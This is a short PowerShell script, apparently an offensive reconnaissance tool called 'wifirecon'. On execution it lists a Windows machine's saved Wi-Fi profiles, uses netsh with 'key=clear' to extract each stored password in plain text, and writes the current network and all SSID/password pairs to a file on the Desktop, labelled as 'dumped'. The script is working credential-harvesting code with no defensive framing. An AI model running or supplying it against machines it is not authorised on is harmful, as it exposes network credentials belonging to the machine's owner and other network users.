# wifirecon

function getWifiConnected {
	$currentWifi = (Get-NetConnectionProfile).Name
	Write-Output "Current AP Connected: $currentWifi"
}


function getWifiNames {
	foreach ($a in ((netsh wlan show profiles | Select-String ": ") -split ':' | select-string -notmatch "All User")) {
		$ssid = ($a.tostring()).trim();
		echo $ssid
	}
}


function getWifiPasswords {
	foreach ($ssid in getWifiNames) {
		$pw = ((netsh wlan show profiles name=$ssid key=clear | select-string -SimpleMatch "Key Content") -split ':' | select-string -notmatch "Key Content")
		if ($pw -eq $null) {
			Write-Output "$ssid - NO PASSWORD"
		} else {
			Write-Output "$ssid - $pw"
		}
	}
}


function dumpIt {
	$outputFile = "$env:userprofile\Desktop\$env:computername.txt"
	Write-Output "$env:computername was dumped!" >> $outputFile
	getWifiConnected >> $outputFile
	getWifiPasswords >> $outputFile
}

dumpIt
